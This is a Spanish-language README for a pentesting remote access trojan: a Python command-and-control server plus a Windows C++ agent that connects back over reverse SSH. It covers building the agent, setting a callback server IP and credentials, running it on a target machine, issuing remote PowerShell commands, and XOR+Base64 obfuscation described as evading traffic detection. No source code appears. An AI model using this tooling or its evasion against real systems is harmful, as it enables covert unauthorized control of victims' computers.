# RamNetSec-RAT

## Descripción General

**RamNetSec-RAT** es un sistema de Command & Control (C2) para pruebas de ciberseguridad y pentesting, compuesto por:

- **Servidor C2** (Python 3): Permite gestionar múltiples agentes, ejecutar comandos remotos, obtener información técnica y abrir consolas interactivas tipo shell/PowerShell en los clientes.
- **Cliente/Agente** (C++ para Windows): Se conecta automáticamente al servidor mediante SSH reverso, ejecuta comandos recibidos, soporta ofuscación XOR+Base64 y modos especiales.

> **Advertencia:** Este software es solo para fines educativos y pruebas en entornos controlados. El uso no autorizado puede ser ilegal.

---

## Arquitectura y Flujo

```mermaid
graph TD
    Cliente[Agente C++ (Windows)]
    Servidor[Servidor C2 (Python)]
    Cliente -- SSH reverso (libssh) --> Servidor
    Servidor -- Comandos/Control --> Cliente
```

- El agente inicia una conexión SSH hacia el servidor C2.
- El servidor autentica y permite enviar comandos, abrir consolas interactivas o solicitar información técnica.
- La comunicación puede ser ofuscada usando XOR + Base64.

---

## Requisitos

### Servidor (Python 3)
- Python 3.8 o superior
- Bibliotecas: `paramiko`, `colorama`, `prompt_toolkit`, `argparse`, `socket`, `logging`
- Archivo de clave privada SSH (`server.key`)

### Cliente (Windows, C++)
- Windows 10/11
- Compilador C++ (g++, MSVC, etc.)
- Biblioteca `libssh` instalada y en el PATH

---

## Instalación

### 1. Clonar el repositorio

```bash
git clone https://github.com/tuusuario/RamNetSec-RAT.git
cd RamNetSec-RAT
```

### 2. Instalar dependencias del servidor

```bash
pip install paramiko colorama prompt_toolkit
```

### 3. Generar clave privada para el servidor (si no existe)

```bash
ssh-keygen -t rsa -b 2048 -f server/server.key
```

### 4. Compilar el cliente para Windows

Asegúrate de tener `libssh` instalado y accesible.

```bash
cd cliente
g++ -std=c++17 cliente_windows.cpp -o cliente_windows -lssh
```

---

## Configuración

### Servidor

- **IP y puerto:** Por defecto escucha en `0.0.0.0:2222`, modificable con argumentos.
- **Clave privada:** Por defecto `server.key`.
- **Clave XOR:** Opcional, para ofuscar comandos y respuestas.

Ejemplo de inicio:

```bash
python server/main.py --host 0.0.0.0 --port 2222 --key server/server.key --xor clave_xor
```

### Cliente

Edita en `cliente_windows.cpp` las siguientes líneas antes de compilar:

```cpp
const std::string server_ip = "IP_DEL_SERVIDOR";
const int port = 2222;
const std::string user = "usuario";
const std::string password = "password";
const std::string XOR_KEY = "clave_xor"; // Debe coincidir con el servidor si usas ofuscación
```

---

## Uso

### 1. Iniciar el servidor

```bash
python server/main.py --host 0.0.0.0 --port 2222 --key server/server.key --xor clave_xor
```

### 2. Ejecutar el cliente en la máquina objetivo

```bash
cliente_windows.exe
```

El cliente intentará reconectarse automáticamente si se pierde la conexión.

### 3. Interfaz del servidor

El servidor ofrece un menú interactivo:

- **1. Listar agentes conectados**
- **2. Enviar comando a un agente**
  - Comando `1`: Abre consola interactiva (PowerShell en Windows)
  - Comando `2`: Solicita información técnica del sistema
  - Cualquier otro comando: Ejecuta en shell/PowerShell y retorna la salida
- **3. Desconectar agente**
- **4. Salir**

#### Ejemplo de flujo

1. Selecciona un agente conectado.
2. Envía `1` para abrir una consola interactiva (escribe comandos en tiempo real, `exit` para salir).
3. Envía `2` para obtener información técnica (hardware, SO, RAM, CPU).
4. Envía cualquier comando de shell/PowerShell para ejecución remota.

---

## Ofuscación XOR + Base64

- Si se configura una clave XOR en ambos extremos, los comandos y respuestas se ofuscan usando XOR y luego Base64.
- Esto ayuda a evadir detección básica de tráfico plano.
- Para desactivar la ofuscación, omite el parámetro `--xor` en el servidor y deja la clave vacía en el cliente.

---

## Seguridad y Advertencias

- Usa claves y contraseñas robustas.
- Limita el acceso al servidor solo a IPs autorizadas.
- El software es solo para pruebas en entornos controlados y con permiso explícito.
- El uso indebido puede ser ilegal y está bajo tu responsabilidad.

---

## Licencia

Este software se distribuye bajo una licencia permisiva personalizada:

- Puedes usar, copiar, modificar, fusionar, publicar, distribuir, sublicenciar y/o vender copias del software, incluso con fines comerciales.
- **Condición:** Toda redistribución, publicación, derivado o reutilización del software, ya sea en forma original o modificada, DEBE conservar y utilizar el nombre original del proyecto: **RamNetSec-RAT**. El nombre debe aparecer en el software, documentación, créditos y materiales asociados. No se permite cambiar el nombre del proyecto en ninguna redistribución o derivado.
- El software se proporciona "tal cual", sin garantías de ningún tipo.

Consulta el archivo [LICENSE](LICENSE) para ver el texto completo.
